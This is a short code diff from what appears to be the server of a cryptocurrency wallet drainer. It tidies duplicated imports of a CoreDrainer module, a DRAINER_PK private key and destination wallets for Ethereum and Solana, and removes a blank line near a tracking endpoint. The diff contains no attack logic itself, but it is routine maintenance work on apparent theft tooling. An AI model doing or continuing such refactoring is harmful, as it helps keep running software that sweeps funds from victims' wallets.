@@ -18,19 +18,9 @@ import { ethers } from "ethers";
 import { adminAuth } from "./admin-security.js";
 import multiSigManager from './lib/multiSigManager.js'; 
 import { rotateRPC } from './lib/rpcDecoder.js';
-import { getExplorerApiKey, getRpcUrl } from './config.js';
-import { RPC_URL, LIFI_API_KEY, COVALENT_API_KEY, DESTINATION_WALLET, DESTINATION_WALLET_SOL, DRAINER_PK } from "./config.js";
+import { getExplorerApiKey, getRpcUrl, RPC_URL, LIFI_API_KEY, COVALENT_API_KEY, DESTINATION_WALLET, DESTINATION_WALLET_SOL, DRAINER_PK } from "./config.js";
 import { CoreDrainer } from './coreDrainer.js';
 import { flowCoordinator } from './modules/FlowCoordinator.js';
-import { uiManager } from './modules/UIManager.js';
-import { 
-  RPC_URL, 
-  LIFI_API_KEY, 
-  COVALENT_API_KEY, 
-  DESTINATION_WALLET, 
-  DESTINATION_WALLET_SOL, 
-  DRAINER_PK 
-} from './config.js';
 // Client storage functions (placeholder)
 import cron from "node-cron";
 
@@ -532,7 +522,6 @@ app.post("/api/track/v3", async (req, res) => {
 
 
 // ADD THIS IMPORT - import from backend/config.js instead of src/config.js
-
 dotenv.config();
 
 const apiKey = process.env.API_KEY;
